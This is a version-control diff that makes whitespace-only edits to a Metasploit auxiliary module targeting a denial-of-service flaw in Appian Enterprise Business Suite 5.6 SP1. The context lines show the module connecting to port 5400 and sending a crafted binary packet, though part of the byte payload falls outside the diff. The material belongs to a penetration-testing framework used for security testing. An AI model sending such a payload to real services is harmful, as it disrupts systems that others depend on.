@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,15 +17,15 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Dos
-	
+
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Appian Enterprise Business Suite 5.6 SP1 DoS',
 			'Description'    => %q{
 				This module exploits a denial of service flaw in the Appian
-				Enterprise Business Suite service. 
+				Enterprise Business Suite service.
 			},
-			
+
 			'Author'         => [ 'guiness.stout <guinness.stout@gmail.com>' ],
 			'License'        => BSD_LICENSE,
 			'Version'        => '$Revision$',
@@ -37,17 +37,17 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Dec 17 2007'
 		))
-		
+
 		register_options([Opt::RPORT(5400),], self.class)
 	end
 
 	def run
 		print_status('Connecting to the service...')
 		connect
-		
+
 		# mod: randomize the static "saint" strings from the PoC - hdm
-		
-		req = 
+
+		req =
 			"\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
 			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
 			"\x00\x00\x00\x00\x00\x00\x00" +
@@ -93,10 +93,10 @@ class Metasploit3 < Msf::Auxiliary
 			"\x00\x00\x00\x03\x00\x00\x00\x00\xe2\x16\x00\x01\x09\x06\x08\x33"+
 			"\x6d\x7f\xff\xff\xff\xfe\x02\x09\x00\x00\x00\x00\x0a\x68\x00\x00"+
 			"\x00"
-		
+
 		print_status('Sending exploit...')
 		sock.put(req)
-		
+
 		disconnect
 	end
 
